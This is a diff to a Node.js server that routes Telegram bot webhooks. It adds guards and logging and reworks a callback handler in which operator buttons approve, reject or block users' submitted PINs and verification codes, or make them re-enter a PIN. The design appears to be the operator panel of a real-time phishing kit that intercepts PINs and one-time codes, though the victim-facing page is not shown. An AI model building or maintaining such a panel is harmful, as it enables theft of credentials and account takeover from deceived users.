@@ -38,7 +38,9 @@ function getBot(botId) {
     return bots.find(b => b.botId === botId);
 }
 
+// ---------------- TELEGRAM HELPERS ----------------
 async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
+    if (!bot || !bot.botToken || !bot.chatId) return;
     try {
         await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
             chat_id: bot.chatId,
@@ -46,17 +48,18 @@ async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
             reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
         });
     } catch (err) {
-        console.error('Telegram send error:', err.response?.data || err.message);
+        console.error(`[${bot.botId}] Telegram send error:`, err.response?.data || err.message);
     }
 }
 
 async function answerCallback(bot, callbackId) {
+    if (!bot) return;
     try {
         await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
             callback_query_id: callbackId
         });
     } catch (err) {
-        console.error(err.response?.data || err.message);
+        console.error(`[${bot.botId}] Telegram callback error:`, err.response?.data || err.message);
     }
 }
 
@@ -75,7 +78,7 @@ async function setAllWebhooks() {
     for (const bot of bots) await setWebhook(bot);
 }
 
-// ---------------- PAGES ----------------
+// ---------------- PAGE ROUTES ----------------
 app.get('/bot/:botId', (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.status(404).send('Invalid bot link');
@@ -138,21 +141,31 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
     const bot = getBot(req.params.botId);
     if (!bot) return res.sendStatus(404);
 
+    // 1️⃣ handle callback_query (buttons)
     const cb = req.body.callback_query;
-    if (!cb) return res.sendStatus(200);
+    if (cb) {
+        const [action, requestId] = cb.data.split(':');
+        let feedback = '';
 
-    const [action, requestId] = cb.data.split(':');
-    let feedback = '';
+        if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN approved ✅'; }
+        if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN rejected ❌'; }
+        if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'User blocked 🛑'; }
+        if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Code approved ✅'; }
+        if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Code rejected ❌'; }
+        if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Code approved – re-enter PIN'; }
 
-    if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN approved ✅'; }
-    if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN rejected ❌'; }
-    if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'User blocked 🛑'; }
-    if (action === 'code_ok') { approvedCodes[requestId] = true; feedback = 'Code approved ✅'; }
-    if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Code rejected ❌'; }
-    if (action === 'code_pin') { approvedCodes[requestId] = true; approvedPins[requestId] = false; feedback = 'Code approved – re-enter PIN'; }
+        if (feedback) await sendTelegramMessage(bot, `📝 Feedback:\n${feedback}`);
+        await answerCallback(bot, cb.id);
+        return res.sendStatus(200);
+    }
 
-    if (feedback) await sendTelegramMessage(bot, `📝 Feedback:\n${feedback}`);
-    await answerCallback(bot, cb.id);
+    // 2️⃣ handle normal messages (so any bot can receive)
+    const message = req.body.message;
+    if (message && message.text) {
+        await sendTelegramMessage(bot, `💬 Received your message: ${message.text}`);
+        return res.sendStatus(200);
+    }
+
     res.sendStatus(200);
 });
 
